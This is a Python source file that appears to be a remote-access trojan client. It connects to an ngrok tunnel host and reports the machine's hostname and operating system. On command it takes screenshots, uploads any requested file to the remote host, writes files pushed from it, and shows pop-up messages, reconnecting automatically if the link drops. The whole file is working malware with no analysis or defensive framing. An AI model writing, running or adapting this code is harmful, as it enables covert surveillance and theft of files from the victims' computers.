import socket, os, sys, platform, time
import pyscreeze
from tkinter import *
import threading

host = "0.tcp.ngrok.io"
port = 18488
buffer_size = 1024

s = socket.socket()

def server_connect():
    while True:
        try:
            s.connect((host, port))
        except socket.error:
            time.sleep(5)
        else: break
    
    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release()
    send_data(str.encode(userInfo))

def decode_utf8(data):
    return data.decode("utf-8")
def receive_data(buffer):
    return s.recv(buffer)
def send_data(data):
    s.send(data)
def take_screenshot():
    picture_name = "beautiful.png"
    pyscreeze.screenshot(picture_name)

    file = open(picture_name, "rb")
    
    image_data = file.read(1024)

    while image_data:
        send_data(image_data)
        image_data = file.read(1024)

    time.sleep(1)
    send_data('done'.encode())
    file.close()
    os.remove(picture_name)

def send_file(file_directory):
    try:
        file_size = os.path.getsize(file_directory)
    except:
        send_data('NotFound'.encode())
        return
    send_data('pass'.encode())

    time.sleep(0.5)

    file = open(file_directory, "rb")
    bytes_read = file.read(4096)
    
    while bytes_read:
        send_data(bytes_read)
        bytes_read = file.read(4096)
    
    time.sleep(1)
    file.close()    
    send_data('done'.encode())

def receive_file(file_name):
    with open(file_name, "wb") as f:
        while True:
            bytes_read = s.recv(4096)
            if bytes_read == 'done'.encode():
                f.close()
                break
            f.write(bytes_read)

def receive_message():
    message = ''
    while True:
            bytes_read = receive_data(4096)
            try:
                if bytes_read == 'done'.encode():
                    break
                message += decode_utf8(bytes_read)
            except:
                pass
    if message != '':
        def messageBox():
            screen = Tk()
            screen.title('Letter for you!')
            screen.geometry('300x300')
            screen.configure(background='#8B0000')
            label = Label(screen, text=message, background='#8B0000', foreground='#fff')
            label.place(x=0, y=110, width=300, height=40)
            screen.mainloop()

        threading.Thread(target=messageBox).start()
        

server_connect()

while True:
    try:
        while True:
            data = receive_data(buffer_size)
            data = decode_utf8(data)
            if data == "exit":
                s.close()
                sys.exit(0)
            elif data == "screenshot":
                take_screenshot()
            elif 'upload-file' in data:
                file_directory = data.split(" ")[1]
                receive_file(file_directory)
            elif 'download-file' in data:
                file_directory = data.split(" ")[1]
                send_file(file_directory)
            elif 'message' in data:
                receive_message()
            else:
                print(data)
    except socket.error:
        s.close()
        del s
        server_connect()